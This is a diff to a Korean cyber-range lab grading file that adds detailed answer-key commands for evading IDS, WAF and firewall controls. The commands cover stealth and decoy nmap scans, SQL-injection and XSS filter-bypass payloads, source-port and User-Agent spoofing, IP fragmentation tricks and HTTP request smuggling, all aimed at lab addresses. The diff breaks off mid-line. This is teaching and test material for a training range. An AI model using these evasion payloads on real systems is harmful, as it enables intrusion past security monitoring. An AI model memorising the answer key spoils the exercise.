@@ -35,13 +35,35 @@ steps:
       - '--- 구분자 + local.rules 내용'
       - SSH 원격 실행
       acceptable_methods:
-      - cat local.rules
-      - suricata --list-keywords
-      - suricata-update list-sources
+      - "ssh ccc@10.20.30.1 'ls /etc/suricata/rules/' (수기 baseline). 출력: local.rules
+        emerging-threats.rules suricata.rules. 해석: 어떤 룰셋이 enable 인지 한눈에. local.rules
+        는 학생/관리자 custom alert 가 모이는 첫 점검 대상."
+      - "ssh secu 'cat /etc/suricata/rules/local.rules | head -30'. 출력: alert tcp
+        any any -> any 22 (msg:\"SSH Brute\"; ...; sid:1000001;). 해석: msg / content
+        / sid 분석 후 동일 의미 다른 시그니처(예: 대소문자 혼합) 페이로드 설계 가능."
+      - "ssh secu 'grep -rE \"^alert\" /etc/suricata/rules/ | head -20'. 출력: 활성 alert
+        룰만 추출 (#주석 제외). 해석: alert vs drop vs reject 비율 → IPS 모드 활성 여부 판정."
+      - "ssh secu 'cat /etc/suricata/suricata.yaml | grep -A20 \"rule-files:\"'. 출력:
+        - local.rules - emerging-threats.rules 등. 해석: 어떤 룰 파일이 로드되는지 config 차원에서 확인.
+        파일은 있어도 yaml 에 없으면 무시됨."
+      - "ssh secu 'systemctl status suricata --no-pager | head -10'. 출력: Active: active
+        (running) since ...; Tasks: 8; Memory: 200M. 해석: 룰 reload 시점 추정 + suricata
+        process 가 실제 트래픽 검사 중인지 검증."
+      - "ssh secu 'sudo suricata --list-keywords | head -30'. 출력: content / pcre /
+        flow / dsize / threshold .... 해석: 어떤 매칭 키워드가 사용 가능한지 → content 기반 룰은 우회
+        쉬움 / pcre 는 어려움 차별 인식."
+      - "ssh secu 'sudo suricata-update list-sources 2>&1 | head -20'. 출력: ET Open /
+        ET Pro / abuse.ch ssl / ... 해석: 외부 룰셋 어느 것 등록됐는지 → 시그니처 데이터셋의 출처 파악
+        후 OSS 우회 정보 검색."
+      - "ssh secu 'sudo suricatasc -c ruleset-stats 2>/dev/null'. 출력: { id: 1, rules_loaded:
+        45000, rules_failed: 0 }. 해석: unix-socket runtime 명령. 룰 reload 안 해도 활성 룰
+        수 / 로드 실패 룰 즉시 확인 가능."
       negative_signs:
-      - 규칙 파일 경로 없음
-      - 단순 ls (내용 없음)
-      - 시그니처 기반 회피 맥락 없음
+      - 규칙 파일 경로 없음 (cat 만 빈 출력)
+      - 단순 ls (내용 없음, 시그니처 분석 없음)
+      - 시그니처 기반 회피 맥락 없음 (그냥 룰 나열만)
+      - alert/drop 구분 없이 통째 dump
+      - msg/content/sid 핵심 필드 무시
   target_vm: attacker
 - order: 2
   instruction: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용하라. 느린 타이밍(-T1), 패킷 분할(-f), 디코이(-D)를
@@ -67,13 +89,37 @@ steps:
       - Stealth scan 키워드
       - 3가지 회피 축 설명
       acceptable_methods:
-      - nmap -T1 -f -D
-      - nmap --scan-delay
-      - masscan --rate 낮춤
+      - "sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 (수기 baseline). 출력:
+        Scanning 4 hosts ... PORT STATE SERVICE 22/tcp open ssh ... (스캔 ~6 분 걸림). 해석:
+        T1 = 15s 패킷 간격 (시간 상관 회피) + -f = 8B 분할 (시그니처 매칭 방해) + -D RND:3 = 랜덤 디코이
+        3 IP. 3축 회피 동시 적용."
+      - "sudo nmap -sS --scan-delay 10s --max-rate 5 -p 22,80,3000 10.20.30.80. 출력:
+        Stats: 0:00:30 elapsed; 1 hosts completed. 해석: --scan-delay 는 probe 간 강제
+        간격 (T 옵션보다 정밀), --max-rate 5 = 초당 5 패킷 cap. 사용자 정의 슬로우 스캔."
+      - "sudo nmap -sS -f --mtu 16 -p 22,80,3000 10.20.30.80. 출력: Note: Fragment scans
+        require MTU multiple of 8. 해석: --mtu 로 분할 크기 직접 지정 (8B 의 배수). 16B = 더 작은
+        분할 = 시그니처 더 깨짐."
+      - "sudo nmap -sS -D 10.0.0.5,10.0.0.6,ME,10.0.0.7 -p 22 10.20.30.80. 출력: PORT
+        22/tcp open ssh. 해석: ME 위치 명시로 실제 스캐너 IP 가 디코이 사이 어디에 위치할지 통제. RND:3
+        보다 의도적 위장."
+      - "sudo masscan -p22,80,3000 10.20.30.80 --rate 10 --wait 5. 출력: Discovered
+        open port 22/tcp on 10.20.30.80. 해석: masscan 자체는 빠른 스캐너지만 --rate 10 +
+        --wait 5 로 슬로우 모드. nmap NSE 시그니처와 다른 패킷 fingerprint."
+      - "sudo hping3 -S -p 22 --interval u500000 -c 10 10.20.30.80. 출력: 10 packets
+        transmitted, 10 received. 해석: hping3 raw TCP SYN. --interval u500000 = 0.5s
+        간격. nmap 시그니처 회피용 대체 도구. -c 카운트로 노출 한정."
+      - "sudo unicornscan -mT -r 5 -I 10.20.30.80:22 2>&1 | head. 출력: TCP open ssh[
+        22] from 10.20.30.80. 해석: unicornscan = nmap 와 다른 패킷 stack 사용 → IDS 가
+        nmap fingerprint 기반이면 우회 가능. -r 5 = 초당 5 패킷."
+      - "sudo nmap -sS -T1 -f -D RND:3 --data-length 50 --randomize-hosts -p 22,80,3000
+        10.20.30.80. 출력: stealth scan completed (모든 옵션 + 데이터 패딩). 해석: 4축 결합
+        — 타이밍/분할/디코이/패딩. 단일 옵션 회피 룰 (예: -f 만 잡는 sid) 도 통과."
       negative_signs:
-      - 옵션 1개 이하
-      - 스텔스 맥락 없음
-      - 디코이 없음
+      - 옵션 1개 이하 (단순 -sS 만)
+      - 스텔스 맥락 없음 (왜 회피하는지 설명 없음)
+      - 디코이 없음 + 분할 없음 + 타이밍 없음 (모든 회피 축 누락)
+      - T0/T2 같은 빠른 타이밍 (탐지 무방비)
+      - 결과 해석 없이 raw output dump
   target_vm: attacker
 - order: 3
   instruction: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형하라. 대소문자 혼합, 주석 삽입, 인코딩 등을 적용하라.
@@ -101,13 +147,38 @@ steps:
       - 변형 기법 4개 이상 (case/주석/인코딩/이중)
       - 실 페이로드 URL 테스트
       acceptable_methods:
-      - 대소문자+주석+인코딩 혼합
-      - sqlmap --tamper
-      - Burp Intruder payload processing
+      - "대소문자+주석+URL 인코딩 혼합 변형 (수기 baseline). 명령: curl 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--'.
+        출력: HTTP 200 + JSON results. 해석: 단일 정규식 룰 (예: /UNION\\s+SELECT/i)
+        은 통과. 대소문자 + 주석 + 인코딩 3축 동시 적용."
+      - "sqlmap --tamper=between,space2comment,charunicodeencode -u 'http://10.20.30.80:3000/rest/products/search?q=test'
+        --batch. 출력: [INFO] testing 'space2comment' tamper script... [INFO] heuristic
+        confirms vulnerable. 해석: tamper 스크립트로 페이로드 자동 변형. between(=
+        BETWEEN), space2comment(공백→/**/), charunicodeencode 조합."
+      - "wfuzz -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u 'http://10.20.30.80:3000/rest/products/search?q=FUZZ'.
+        출력: 000000123: 200 ... \"q\":\"' OR 1=1--\". 해석: SecLists 의 SQLi 페이로드 60+
+        변형 자동 fuzz. 응답 코드 차이로 WAF 통과/차단 매핑."
+      - "Burp Suite Intruder + payload processing rule 'Match and Replace UNION→UN/**/ION'.
+        출력: Request 1: 403 / Request 2: 200 (인코딩) / Request 3: 200 (대소문자). 해석:
+        Burp processing rule chain 으로 한 base payload → N 변형 자동. 결과 code 매트릭스."
+      - "echo \"' OR 1=1--\" | xxd -p (hex 인코딩). 출력: 27204f5220313d312d2d. URL: %27%20OR%201%3D1--.
+        해석: hex/URL/이중URL 인코딩 단계. 페이로드를 다중 인코딩 후 WAF 디코딩 단계 차이 악용 (CRS 의 일부 룰은
+        한 번만 디코드)."
+      - "python3 -c 'import urllib.parse; print(urllib.parse.quote(urllib.parse.quote(\"\\'\\
+        OR 1=1--\")))'. 출력: %2527%2520OR%25201%253D1--. 해석: 이중 URL 인코딩.
+        브라우저/curl 한 번 디코드 → 서버 두 번 디코드. WAF 가 한 번만 디코드하면 통과."
+      - "curl --data-urlencode 'q=test\\u0027 OR 1=1--' http://10.20.30.80:3000/rest/products/search.
+        출력: HTTP 200 + 검색 결과. 해석: 유니코드 escape (\\u0027 = ') 형태. 일부 WAF 는 유니코드
+        normalize 단계 누락 → 시그니처 매칭 실패."
+      - "OWASP CRS exclusion rule + paranoia level 1 환경에서 페이로드 검증 — curl 후 sudo grep
+        'id \\\"942100\\\"' /var/log/apache2/error.log. 출력: [Wed Apr ...] ModSecurity:
+        Warning. Pattern match \"...\" id \"942100\" msg \"SQL Injection Attack\". 해석:
+        어떤 변형이 어떤 CRS sid 에 잡히는지 매핑 → 잡히지 않는 변형이 우회 페이로드."
       negative_signs:
-      - 변형 2개 이하
-      - 정규식 회피 맥락 없음
-      - 실 요청 없음
+      - 변형 2개 이하 (대소문자 한 가지만 등)
+      - 정규식/시그니처 회피 맥락 없음 (왜 변형하는지 설명 없음)
+      - 실 HTTP 요청 없음 (이론만)
+      - 인코딩 단계 없음 (생 ASCII payload 만)
+      - 응답 코드 비교 없음 (어느 변형이 통과했는지 모름)
   target_vm: attacker
 - order: 4
   instruction: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연하라.
@@ -137,13 +208,38 @@ steps:
       - 변형 페이로드 4개 이상
       - 실제 URL 인코딩 테스트
       acceptable_methods:
-      - onerror/onload/onfocus 핸들러
-      - SVG + data URI
-      - XSS polyglot (0xsp/PayloadsAllTheThings)
+      - "이벤트 핸들러 + SVG + data URI 페이로드 작성 (수기 baseline). 명령: echo '<img src=x
+        onerror=alert(1)>' '<svg onload=alert(1)>' '<body onload=alert(1)>'. 출력: 3
+        변형 출력. 해석: <script> 차단 시 onerror/onload/onfocus 등 HTML 이벤트 핸들러 + SVG/
+        data URI 로 JavaScript 실행 경로 우회."
+      - "curl 'http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>'.
+        출력: HTTP 200 / 200 / 403 (페이로드별). 해석: URL 인코딩된 페이로드 → JuiceShop 응답 후
+        DOM 에 reflected. ModSecurity 941100 룰 매칭 여부 측정."
+      - "dalfox url 'http://10.20.30.80:3000/rest/products/search?q=' --skip-bav. 출력:
+        [V] [POC][R][POST] http://...?q=<svg/onload=alert(1)>. 해석: dalfox = Go 기반
+        XSS 자동 스캐너. payload database 800+ 변형 자동 시도 + browser-based verification."
+      - "xsstrike -u 'http://10.20.30.80:3000/rest/products/search?q=test' --crawl --skip-dom.
+        출력: [+] Vulnerable parameter: q [+] Payload: <svg/onload=alert(1)>. 해석:
+        XSStrike = Python 기반. AI 기반 페이로드 mutation. WAF fingerprint 후 자동 회피 페이로드
+        생성."
+      - "OWASP XSS Filter Evasion Cheatsheet 의 polyglot payload — \"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(42);//'>\".
+        출력: alert 트리거. 해석: 한 개의 페이로드가 6+ 컨텍스트 (HTML/JS/attribute/comment 등)에서 실행.
+        다중 컨텍스트 동시 회피."
+      - "echo '<img src=x onerror=eval(atob(\"YWxlcnQoMSk=\"))>' (base64 인코딩 페이로드). 출력:
+        decode → alert(1). 해석: alert 시그니처 직접 차단 시 base64 → atob() + eval() 우회.
+        WAF 가 base64 string 도 디코드 후 검사하지 않으면 통과."
+      - "wfuzz -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Bypass.txt -u 'http://10.20.30.80:3000/rest/products/search?q=FUZZ'.
+        출력: 000123: 200 ... \"q\":\"<svg/onload=...>\". 해석: SecLists 의 XSS bypass payload
+        수백 변형 fuzz. 응답 코드 + reflected content 비교로 통과 매핑."
+      - "Burp Suite Repeater 수동 — 같은 base payload 에 다른 변형 (대소문자/공백 → tab, 따옴표
+        → backtick, ; → newline) 8 회 반복. 응답: 403/200/200/403/.... 해석: WAF 룰셋의
+        정확한 token boundary 식별 → 이후 자동 회피 도구로 확장."
       negative_signs:
-      - <script>만 사용
-      - 이벤트 핸들러 없음
-      - 4개 미만
+      - <script>만 사용 (가장 차단되기 쉬움)
+      - 이벤트 핸들러 없음 (img/svg/body onload 누락)
+      - 변형 4개 미만 (다양성 부족)
+      - 단순 alert(1) 만 (인코딩/polyglot/base64 우회 없음)
+      - 실제 HTTP 요청 없이 페이로드 텍스트만
   target_vm: attacker
 - order: 5
   instruction: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회하라.
@@ -166,13 +262,39 @@ steps:
       - DNS/HTTP 소스 포트 맥락
       - '--- 구분자 + 설명'
       acceptable_methods:
-      - nmap -g 53
-      - hping3 --baseport
-      - scapy sport=53
+      - "sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 (수기 baseline). 출력: PORT STATE
+        SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp. 해석: -g 53 = source
+        port 53 (DNS). 일부 stateless 방화벽이 'src=53 → 응답 트래픽' 으로 오인 → ingress
+        rule 회피."
+      - "sudo nmap -sS --source-port 80 -p 22,80,3000 10.20.30.80. 출력: PORT 22/tcp
+        open ssh ... 해석: --source-port 80 = HTTP. 'reverse proxy 응답' 처럼 위장. -g
+        와 동등 (별칭). HTTP 허용 룰 통과."
+      - "sudo hping3 -S -s 53 -p 22 -c 3 10.20.30.80. 출력: HPING 10.20.30.80: S set,
+        win 65535 ... ip=10.20.30.80 sport=22 flags=SA. 해석: hping3 -s 53 = source
+        port 53. flags=SA (SYN+ACK) = 포트 열림. raw TCP 제어로 nmap 패킷 fingerprint
+        다름."
+      - "sudo python3 -c 'from scapy.all import *; sr1(IP(dst=\"10.20.30.80\")/TCP(sport=53,dport=22,flags=\"S\"),
+        timeout=2)'. 출력: <TCP sport=ssh dport=53 flags=SA>. 해석: scapy 로 source port
+        직접 조작. 단일 패킷 정밀 테스트. nmap/hping 와 다른 fingerprint."
+      - "sudo nmap -sS -g 53 -f -D RND:3 -p 22 10.20.30.80. 출력: stealth scan + source
+        port 53. 해석: -g 53 + -f (분할) + -D (디코이) 결합. 단일 옵션 회피 룰 모두 우회 가능한
+        다축 회피."
+      - "방화벽 룰 사전 분석 — ssh ccc@10.20.30.1 'sudo nft list ruleset | grep -E \"sport
+        53|sport 80\"'. 출력: tcp sport 53 accept. 해석: secu 의 nft 룰에 'sport=53 허용'
+        명시 룰 존재 시 -g 53 우회 100% 효과. 존재 여부 사전 검증."
+      - "iptables-save 분석 (legacy 시스템) — ssh secu 'sudo iptables-save | grep --
+        --sport'. 출력: -A INPUT -p tcp --sport 53 -j ACCEPT. 해석: iptables 환경에서
+        --sport 룰 식별. Stateful 방화벽 (--state RELATED,ESTABLISHED) 인지 stateless 인지
+        판단 후 회피."
+      - "Suricata fast.log 동시 모니터링 — terminal 1: ssh secu 'sudo tail -f /var/log/suricata/fast.log';
+        terminal 2: 위 nmap 실행. 출력: alert vs no alert 비교. 해석: -g 53 회피가 IDS 시그니처
+        (예: 'ET SCAN nmap fingerprint') 도 회피하는지 동시 측정."
       negative_signs:
-      - -g 없음
-      - 소스 포트 변경 없음
-      - 방화벽 우회 맥락 없음
+      - -g/--source-port 없음 (기본 random source port)
+      - 소스 포트 변경 안 함 (단순 -sS 만)
+      - 방화벽 우회 맥락 없음 (왜 53/80 인지 설명 없음)
+      - 사전 룰 분석 없이 추측만
+      - stateful vs stateless 차이 무시
   target_vm: attacker
 - order: 6
   instruction: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를 사용하라.
@@ -200,13 +322,41 @@ steps:
       - 기본 vs 위장 UA 비교
       - 알려진 스캐너 UA 언급
       acceptable_methods:
-      - curl -H User-Agent
-      - nikto -useragent
-      - sqlmap --random-agent
+      - "curl -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Chrome/120.0.0.0' http://10.20.30.80:3000/ (수기 baseline). 출력: HTTP/1.1
+        200 OK + JuiceShop HTML. 해석: 기본 curl UA = 'curl/8.x' (즉시 탐지). Chrome
+        UA 위장으로 'known scanner' 시그니처 우회."
+      - "기본 vs 위장 비교 — curl -sI http://10.20.30.80:3000 | grep -i server (UA=curl)
+        + curl -sI -H 'User-Agent: Mozilla...' http://10.20.30.80:3000 | grep -i server
+        (UA=Chrome). 해석: 두 호출 응답 비교. 어떤 UA 가 차단/모니터되는지 매핑."
+      - "nikto -h http://10.20.30.80:3000 -useragent 'Mozilla/5.0 (Windows NT 10.0)'.
+        출력: + Server: Apache/2.4.52 + Allowed HTTP Methods: GET, POST, HEAD .... 해석:
+        nikto 기본 UA = 'Mozilla/5.0 (compatible; Nikto/2.x)' (즉시 탐지). -useragent
+        로 정상 브라우저 위장."
+      - "sqlmap -u 'http://10.20.30.80:3000/rest/products/search?q=1' --random-agent
+        --batch. 출력: [INFO] testing connection to the target URL [INFO] HTTP user-agent:
+        Mozilla/5.0 (X11; Linux x86_64) Firefox/100. 해석: --random-agent = sqlmap
+        가 매 요청마다 user-agents.txt 에서 랜덤 선택. sqlmap fingerprint 회피."
+      - "wget --user-agent='Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
+        http://10.20.30.80:3000/. 출력: --2026-05-04 ... HTTP request sent... 200 OK.
+        해석: wget 도 UA 변경 가능. iOS Safari UA 위장. modal user-agent 분석 회피
+        (특정 OS/브라우저 통계 분포 정상화)."
+      - "hydra -L users.txt -P pass.txt 10.20.30.80 http-post-form -u '/api/login:user=^USER^&pass=^PASS^:invalid'
+        -m '/User-Agent: Mozilla/5.0/'. 출력: [STATUS] attack finished. 해석: hydra 도
+        -m 또는 모듈 옵션으로 UA 변경. 기본 hydra UA = 'Mozilla/4.0' 식 기형 → IDS 정확히 탐지."
+      - "Burp Suite Proxy match-replace rule — Request header User-Agent → Mozilla/5.0
+        all. 출력: 모든 outgoing request 의 UA 자동 치환. 해석: 수동 도구 (Burp/Repeater) 사용
+        시 모든 요청 일관된 UA 적용. 도구별 UA 누락 방지."
+      - "Apache access.log 검증 — ssh ccc@10.20.30.80 'sudo tail -5 /var/log/apache2/access.log'.
+        출력: 10.20.30.201 - - [04/May/2026:08:30:00] \"GET / HTTP/1.1\" 200 - \"Mozilla/5.0
+        Chrome/120\". 해석: 위장 UA 가 실제 web 서버 로그에 어떻게 기록되는지 확인 → ModSec/CRS 룰
+        이 UA 기반 탐지하는지 사후 검증."
       negative_signs:
-      - UA 위장 없음
-      - 비교 없음
-      - WAF 도구 탐지 맥락 없음
+      - UA 위장 없음 (기본 curl/wget/python-requests UA)
+      - 기본 vs 위장 비교 없음 (한쪽만 호출)
+      - WAF/IDS 의 도구 탐지 맥락 없음
+      - sqlmap/nikto/hydra 같은 알려진 스캐너 UA 그대로 사용
+      - 응답 차이 측정 없음 (어떤 UA 가 통과하는지 모름)
   target_vm: attacker
 - order: 7
   instruction: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송하라.
@@ -231,13 +381,38 @@ steps:
       - fragmentation 키워드
       - IDS 재조립 한계 설명
       acceptable_methods:
-      - hping3 -f
-      - nmap -f / --mtu
-      - scapy fragment()
+      - "sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 (수기 baseline). 출력: HPING 10.20.30.80
+        ... len=8 ... ip=10.20.30.80 flags=SA. 해석: -f = 8 byte 분할. 한 패킷이 여러 IP
+        프래그먼트로 쪼개짐 → IDS content 매칭 (단일 패킷 기준) 회피."
+      - "sudo nmap -sS -f -p 22,80 10.20.30.80. 출력: PORT STATE SERVICE 22/tcp open
+        ssh. 해석: nmap -f = TCP 헤더 + payload 를 8 byte 단위 분할. nmap 의 -ff = 16
+        byte 단위. -f -f 같이 줄 수도."
+      - "sudo nmap -sS --mtu 24 -p 22 10.20.30.80. 출력: Note: Fragment scans require
+        MTU multiple of 8. 해석: --mtu 명시 (8 의 배수만 허용). MTU 24 = 작은 분할 → 더 강한
+        시그니처 회피. MTU 16/24/32 시도."
+      - "sudo python3 -c 'from scapy.all import *; pkt=IP(dst=\"10.20.30.80\")/TCP(dport=22,flags=\"S\");
+        frags=fragment(pkt, fragsize=8); send(frags)'. 출력: 3 패킷 송신 (분할). 해석: scapy
+        fragment() 함수 = 정밀 분할 제어. fragsize 임의 지정."
+      - "scapy 오버랩 fragment — IP(dst='target', frag=0)/'AAAAAAAA' + IP(dst='target',
+        frag=1, flags='MF')/'BBBBBBBB'. 출력: 의도적 오버랩 패킷. 해석: 표준 위반 오버랩 fragment
+        → IDS 재조립 알고리즘 (BSD-right vs Linux-first 차이) 회피. classic Ptacek-Newsham
+        evasion."
+      - "TTL 기반 fragment evasion — scapy IP(ttl=5)/TCP(... flags='S'). 출력: target
+        도달 전 ttl=0 으로 drop 되는 더미 fragment + 진짜 fragment 혼합. 해석: IDS 는 모든 fragment
+        보지만 target 은 일부만 봄. content 다른 위치 매칭 → IDS 다른 결과 (Ptacek-Newsham 1998)."
+      - "fragroute 도구 — sudo fragroute -f /etc/fragroute.conf 10.20.30.80. config 예:
+        'tcp_seg 8 new'. 해석: fragroute = 시스템 wide fragment 변환 wrapper. 모든 outbound
+        패킷 자동 분할. 다른 도구 (curl/sqlmap 등) 도 분할 적용."
+      - "Suricata 동시 모니터링 — terminal 1: ssh secu 'sudo tail -f /var/log/suricata/fast.log';
+        terminal 2: 위 hping3/nmap fragment 실행. 출력: 분할 vs 비분할 alert 차이. 해석: IDS
+        가 fragment 재조립 후 detect 하는지, 못 하는지 측정. Suricata 8.x 는 stream-events
+        룰로 일부 detect 가능."
       negative_signs:
-      - 분할 옵션 없음
-      - 재조립 맥락 없음
-      - 단일 패킷
+      - 분할 옵션 없음 (-f / --mtu / fragment() 누락)
+      - 재조립 맥락 없음 (IDS 가 어떻게 처리하는지 설명 X)
+      - 단일 패킷 송신 (분할 의미 없음)
+      - 오버랩/TTL 변형 없음 (기본 분할만)
+      - IDS alert 사후 검증 없음
   target_vm: attacker
 - order: 8
   instruction: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
@@ -266,13 +441,38 @@ steps:
       - CL-TE 또는 TE-CL 시나리오
       - 프론트/백엔드 파싱 차이 설명
       acceptable_methods:
-      - CL-TE / TE-CL / TE-TE
-      - Burp Smuggler 확장
-      - h2c 스머글링 (HTTP/2)
+      - "CL-TE 페이로드 작성 (수기 baseline) — printf 'POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length:
+        13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc -q 1
+        target 80. 출력: HTTP/1.1 200 OK + 후속 응답에 SMUGGLED 흔적. 해석: 프론트엔드(WAF)는 CL=13
+        으로 13 byte 만 처리, 백엔드는 TE chunked 로 0 chunk 후 SMUGGLED 를 새 요청 시작으로 인식."
+      - "TE-CL 변형 — POST / HTTP/1.1 + Transfer-Encoding: chunked + Content-Length: 6
+        + 빈줄 + 8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n. 출력: 두 번째 요청이 후속 client 의 응답에
+        prefix 됨. 해석: 프론트엔드 TE 우선, 백엔드 CL 우선 → 반대 방향 desync. 캐시 poisoning 가능."
+      - "TE-TE (헤더 obfuscation) — Transfer-Encoding: chunked + Transfer-Encoding:
+        x. 출력: 한쪽 서버가 두 번째 TE 무시. 해석: 둘 다 TE 인식하지만 한쪽이 'x' 같은 invalid
+        값에 보수적 → CL 로 fallback. 다른 쪽은 chunked 만. desync 발생."
+      - "Burp Suite HTTP Request Smuggler 확장 (PortSwigger 공식). 출력: [+] CL.TE
+        smuggling vulnerability detected on /. [+] Confidence: high. 해석: 자동 탐지
+        + 페이로드 생성. CL.TE / TE.CL / TE.TE 8 종 변형 자동 시도."
+      - "smuggler.py (defparam/smuggler) — python3 smuggler.py -u http://10.20.30.80
+        -m DELETE -t 30. 출력: [+] CL.TE Smuggling at TIMEOUT. 해석: time-based 탐지
+        — 백엔드가 SMUGGLED 처리하느라 응답 지연. 5+ s 차이로 vulnerable 판정."
+      - "h2c smuggling (HTTP/2 → HTTP/1.1 다운그레이드) — curl --http2-prior-knowledge
+        --header 'Upgrade: h2c' http://10.20.30.80/. 출력: HTTP/1.1 101 Switching
+        Protocols. 해석: 프론트엔드는 HTTP/1, 백엔드는 H2C 로 해석 → 프레임 의미 다름.
+        2021 James Kettle 발표."
+      - "websocket smuggling — Upgrade: websocket + Sec-WebSocket-Key (CL/TE 동시).
+        출력: HTTP/1.1 101 Switching Protocols. 해석: WS 핸드셰이크 후 raw bytes 가 백엔드
+        에 흘러감 → WAF inspection 우회. WS upgrade 가 새 컨텍스트로 인식."
+      - "사후 검증 — Apache log + WAF log 양쪽 비교. ssh ccc@10.20.30.80 'sudo tail
+        /var/log/apache2/access.log' + ssh secu 'sudo grep ModSecurity /var/log/apache2/error.log'.
+        출력: WAF 에서 1 요청 / 백엔드에서 2 요청 기록 → 수치 차이 = smuggling 증거."
       negative_signs:
-      - 스머글링 원리 없음
-      - 파싱 차이 없음
-      - 헤더 조합 없음
+      - 스머글링 원리 없음 (CL-TE 차이 설명 X)
+      - 파싱 차이 없음 (왜 desync 발생하는지 모름)
+      - 헤더 조합 없음 (단일 CL 또는 TE 만)
+      - 실제 요청 송신 없음 (예시 텍스트만)
+      - 사후 검증 (응답/로그 차이) 없음
   target_vm: attacker
 - order: 9
   instruction: 'Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석하라.
@@ -300,13 +500,42 @@ steps:
       - alert 키워드 출력
       - secu 원격 SSH
       acceptable_methods:
-      - tail fast.log
-      - jq eve.json
-      - Wazuh decoder
+      - "fixture 직접 분석 (수기 baseline) — jq -c '.alert' /home/ccc/cyber-range/fixtures/attack-nonai-week12/9/eve.json
+        | head -10. 출력: {\"signature\":\"ET MALWARE C2 Beacon\",\"category\":\"trojan\",\"severity\":1}.
+        해석: eve.json = Suricata 의 EVE JSON 출력. .alert 추출 후 signature/category/severity
+        3 축 분류."
+      - "빈도 분석 — jq -r '.alert.signature' eve.json | sort | uniq -c | sort -rn |
+        head -10. 출력: 12 ET MALWARE C2 Beacon / 4 ET WEB Cloud Metadata Probe /
+        2 ET POLICY Suspicious DNS. 해석: 어떤 시그니처가 가장 많이 발생했는지 → 공격 패턴 우선
+        순위. C2 12 회 = beacon traffic (지속적)."
+      - "시간 분포 — jq -r '.timestamp' eve.json | cut -dT -f1 | sort | uniq -c. 출력:
+        4 2026-04-28 / 8 2026-04-29 / 12 2026-04-30 / 6 2026-05-01. 해석: 7 일 분포.
+        증가 추세 = 공격 활성화. 첫 발생 시점 = initial access timestamp."
+      - "MITRE ATT&CK 매핑 — jq -r '.alert.metadata.mitre_attack' eve.json | sort
+        | uniq -c. 출력: 5 T1071.001 / 3 T1552.005 / 2 T1090. 해석: T1071.001
+        = Application Layer Protocol C2, T1552.005 = Cloud Metadata, T1090 = Proxy.
+        ATT&CK matrix 단계 식별."
+      - "SRC/DST 매트릭스 — jq -r '\\\"\\(.src_ip) → \\(.dest_ip):\\(.dest_port) [\\(.alert.signature)]\\\"'
+        eve.json | sort -u | head. 출력: 10.20.30.201 → 169.254.169.254:80 [ET WEB
+        Cloud Metadata]. 해석: 트래픽 fingerprint. cloud metadata service 접근 시도 = 권한
+        탈취 IoC."
+      - "ssh secu 'sudo tail -30 /var/log/suricata/fast.log'. 출력: 04/30/2026-15:30:12.123456
+        [**] [1:2025025:1] ET MALWARE C2 Beacon [**] [Classification: A Network Trojan].
+        해석: fast.log = 사람이 읽기 쉬운 alert. timestamp / sid / category 한눈에. eve.json
+        병행 분석으로 detail 확보."
+      - "Wazuh decoder 연동 — ssh ccc@10.20.30.100 'sudo tail /var/ossec/logs/alerts/alerts.json
+        | jq .rule'. 출력: { id: 86600, level: 7, description: \"Suricata: Alert\"
+        }. 해석: Suricata alert 가 Wazuh agent 통해 SIEM 로 forward. rule 86600 매칭.
+        SIEM 단에서 추가 correlation."
+      - "방어 권고 3 섹션 작성 — (1) 빈도 패턴: C2 beacon 12 회 / cloud metadata 4 회. (2)
+        MITRE: T1071.001 / T1552.005. (3) 방어: nft drop 169.254.169.254 + Suricata
+        proxy 룰 + Wazuh AR 자동 차단. 해석: raw dump 금지. 분석 → 패턴 → 방어 3단 결론."
       negative_signs:
-      - 로그 경로 없음
-      - tail/cat 없음
-      - 분석 맥락 없음
+      - 로그 경로 없음 (eve.json 위치 모름)
+      - tail/cat 없음 (fixture 미사용)
+      - 분석 맥락 없음 (raw dump 만, 빈도/패턴 추출 X)
+      - MITRE 매핑 없음
+      - 방어 권고 없음 (3섹션 분석 미완)
   target_vm: attacker
   fixtures:
   - generator: suricata_alert
@@ -344,13 +573,41 @@ steps:
       - RANDOM + sleep 랜덤화
       - for 루프 반복 요청
       acceptable_methods:
-      - bash $RANDOM + sleep
-      - python random.uniform() + time.sleep()
-      - Burp Intruder throttle
+      - "bash 랜덤 지연 (수기 baseline) — for i in 1 2 3 4 5; do DELAY=$((RANDOM % 10
+        + 1)); curl -s http://10.20.30.80:3000/; sleep $DELAY; done. 출력: Request 1 (3s)
+        / 2 (7s) / 3 (1s) / 4 (9s) / 5 (4s). 해석: $RANDOM (0-32767) % 10 = 1-10초.
+        IDS 의 'X req in Y sec' 시간 상관 룰 회피."
+      - "python 정밀 jitter — python3 -c 'import requests, time, random; [(requests.get(\"http://10.20.30.80:3000/\"),
+        time.sleep(random.uniform(0.5, 5.0))) for _ in range(5)]'. 출력: 5 GET 요청 + 0.5~5.0s
